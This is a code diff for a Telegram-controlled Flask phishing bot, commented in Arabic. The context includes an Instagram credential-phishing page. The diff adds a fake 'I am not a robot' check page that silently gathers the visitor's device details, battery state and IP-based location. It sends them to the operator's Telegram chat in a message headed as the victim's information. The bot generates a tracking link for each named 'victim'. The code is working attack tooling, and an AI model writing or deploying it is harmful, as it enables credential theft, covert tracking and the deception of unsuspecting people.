@@ -19,7 +19,6 @@ def send_message(chat_id, text, reply_markup=None):
     except Exception as e:
         print(f"Error: {e}")
 
-# دالة جديدة عشان تقفل اللفة اللي على الزرار
 def answer_callback(callback_id):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     payload = {"callback_query_id": callback_id}
@@ -53,6 +52,7 @@ def main_menu():
         ]
     }
 
+# صفحة تصيد انستغرام
 @app.route('/')
 def index():
     admin = request.args.get('admin', '')
@@ -96,6 +96,103 @@ def login():
         send_message(admin_id, msg)
     return redirect("https://www.instagram.com")
 
+# --- صفحة جمع معلومات الجهاز الجديدة ---
+@app.route('/device')
+def device_page():
+    admin = request.args.get('admin', '')
+    target = request.args.get('target', '')
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html>
+    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تحقق من الأمان</title>
+    <style>
+    body{font-family:Arial;background:#f2f4f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+    .box{background:#fff;padding:30px;width:300px;text-align:center;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}
+    button{width:100%;padding:12px;background:#28a745;color:#fff;border:none;border-radius:6px;font-weight:bold;font-size:16px;margin-top:20px;cursor:pointer}
+    </style>
+    </head>
+    <body>
+    <div class="box">
+    <h2>جاري التحقق من هويتك...</h2>
+    <p style="color:#666;font-size:14px;">اضغط بالأسفل لتأكيد أنك لست روبوت</p>
+    <button onclick="gatherData('{{ admin }}', '{{ target }}')">أنا لست روبوت</button>
+    </div>
+
+    <script>
+    async function gatherData(admin, target) {
+        let info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language,
+            cores: navigator.hardwareConcurrency || "Unknown",
+            ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
+            battery: "Unknown",
+            admin: admin,
+            target: target
+        };
+
+        try {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                info.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
+            }
+        } catch(e) {}
+
+        fetch('/collect_device', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        }).then(() => {
+            window.location.href = 'https://www.google.com';
+        });
+    }
+    </script>
+    </body>
+    </html>
+    """, admin=admin, target=target)
+
+@app.route('/collect_device', methods=['POST'])
+def collect_device():
+    data = request.get_json()
+    admin_id = data.get('admin')
+    target = data.get('target')
+    
+    # الحصول على الـ IP الحقيقي وتخطي بروكسي Render
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ',' in ip:
+        ip = ip.split(',')[0].strip()
+        
+    # جلب الدولة والمحافظة عن طريق الـ IP
+    country, city, isp = "Unknown", "Unknown", "Unknown"
+    try:
+        geo_req = requests.get(f'http://ip-api.com/json/{ip}', timeout=3).json()
+        if geo_req.get('status') == 'success':
+            country = geo_req.get('country')
+            city = geo_req.get('city')
+            isp = geo_req.get('isp')
+    except:
+        pass
+
+    msg = (
+        f"📱 *معلومات جهاز الضحية!*\n\n"
+        f"🎯 الهدف: `{target}`\n"
+        f"🌐 الـ IP: `{ip}`\n"
+        f"📍 الدولة/المحافظة: `{country} / {city}`\n"
+        f"📡 الشبكة: `{isp}`\n"
+        f"🔋 البطارية: `{data.get('battery')}`\n"
+        f"📱 نظام التشغيل والجهاز: `{data.get('userAgent')}`\n"
+        f"🖥 دقة الشاشة: `{data.get('screen')}`\n"
+        f"🧠 الرام: `{data.get('ram')}`\n"
+        f"⚙️ المعالج (أنوية): `{data.get('cores')}`\n"
+        f"🌍 اللغة: `{data.get('lang')}`\n"
+    )
+    
+    if admin_id:
+        send_message(admin_id, msg)
+    return "ok", 200
+# -------------------------------------
+
 @app.route(f'/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
@@ -109,25 +206,34 @@ def webhook():
         
         if text == '/start':
             send_message(chat_id, "مرحباً بك في FREEUSR ➊\n\nمن الخيارات المتاحة:", main_menu())
-        elif user_state.get(chat_id) == 'waiting_for_target':
+            
+        elif user_state.get(chat_id, {}).get('state') == 'waiting_for_target':
             target = text
-            link = f"{BASE_URL}/?target={target}&admin={chat_id}"
+            action = user_state[chat_id]['action']
+            if action == 'insta':
+                link = f"{BASE_URL}/?target={target}&admin={chat_id}"
+            elif action == 'device':
+                link = f"{BASE_URL}/device?target={target}&admin={chat_id}"
+            
             send_message(chat_id, f"✅ الرابط:\n`{link}`", None)
             del user_state[chat_id]
     
     if 'callback_query' in update:
         cb = update['callback_query']
-        cb_id = cb['id']  # سحب معرف الضغطة
+        cb_id = cb['id']
         chat_id = cb['message']['chat']['id']
         data = cb['data']
         
-        answer_callback(cb_id)  # إبلاغ تيليجرام فوراً عشان الزرار يبطل يلف
+        answer_callback(cb_id)
         
         if data == 'joke':
             send_message(chat_id, "مرة واحد روبوت دخل مطعم قاله عايز بطارية مشوية 😂")
         elif data == 'insta':
-            user_state[chat_id] = 'waiting_for_target'
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'insta'}
             send_message(chat_id, "📸 أرسل اسم أو إيميل الضحية:")
+        elif data == 'v4': # زر جمع معلومات الجهاز
+            user_state[chat_id] = {'state': 'waiting_for_target', 'action': 'device'}
+            send_message(chat_id, "🔬 أرسل اسم الضحية (أو أي وصف) عشان نجهز الرابط:")
         else:
             send_message(chat_id, "تم تنفيذ طلبك بنجاح ✅\nجاري استخراج البيانات...")
             
